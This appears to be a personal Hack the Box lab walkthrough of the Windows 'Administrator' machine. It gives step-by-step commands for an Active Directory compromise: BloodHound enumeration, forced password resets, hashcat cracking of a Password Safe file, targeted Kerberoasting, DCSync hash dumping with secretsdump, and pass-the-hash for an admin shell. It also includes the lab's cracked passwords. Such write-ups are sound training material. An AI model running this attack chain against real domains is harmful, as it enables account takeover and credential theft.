# Administrator

**Platform: Hack the Box**

**OS: Windows**

**Diffculty: Medium**


## Key Learnings

- Familiarize myself with enumerating AD networks using Bloodhound
- Abuse GenericAll and ForceChangePassword privileges to change user passwords using *net rpc*
- Exploit GenericWrite privileges by running a targeted kerberoasting attack on vulnerable account
- Abuse DCSync privs to dump SAM and LSA hashes and compromise the Domain Controller by passing the hash
- Use Hashcat to crack .psafe3 file


## **Disclaimer: Potential spoilers below**


## Walkthrough

1. Run nmap scan
2. Given olivia's credentials, run bloodhound to gather AD info
	1. `neo4j console`
	2. `sudo bloodhound`
	3. `sudo bloodhound-python -d administrator.htb -u olivia -p ichliebedich -ns [IP] -c all`
3. load bloodhound info
4. bloodhound finds that olivia has GenericAll privs over michael
5. change michael's password
	1. `net rpc password "michael" -U "administrator.htb"/"olivia" -S "[IP]"`
	2. type new password
6. michael has ForceChangePassword permission over benjamin
7. change benjamin's password 
	1. `net rpc password "benjamin" -U "administrator.htb"/"michael" -S "[IP]"`
8. benjamin can login to ftp, get Backup.psafe3 file
9. use hashcat to crack password on psafe3
	1. `hashcat -m 5200 Backup.psafe3 /usr/share/wordlists/rockyou.txt`
10. reveals password for psafe3 file is `tekieromucho`
11. opening the psafe3 file reveals 3 credentials:
	1. alexander
	2. emily
	3. emma
12. bloodhound shows the emily has GenericWrite privs over ethan
13. before doing kerberoast attack, need to fix clock skew
	1. On actual machine, not VM, go to cmd and cd into this folder `C:\Program Files\Oracle\VirtualBox`
	2. run this command `VBoxManage setextradata "VM name" "VBoxInternal/Devices/VMMDev/0/Config/GetHostTimeDisabled" 1`
	3. then, on Kali VM, run `sudo rdate -n [IP]`
14. now can do a targeted kerberoast attack on ethan using emily's credentials
	1. `targetedKerberoast.py --dc-ip [IP] -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb`
15. this reveals ethan's password is `limpbizkit`
16. ethan has DCSync permission over Administrator.htb. This means ethan is local admin so can do secretdump
	1. `secretsdump.py administrator.htb/ethan:limpbizkit@[IP]`
17. this gives us Administrator hash so can do PtH with evil-winrm 
	1. `evil-winrm -i [IP] -u administrator -H [HASH]`
18. gives us admin shell and rooted!
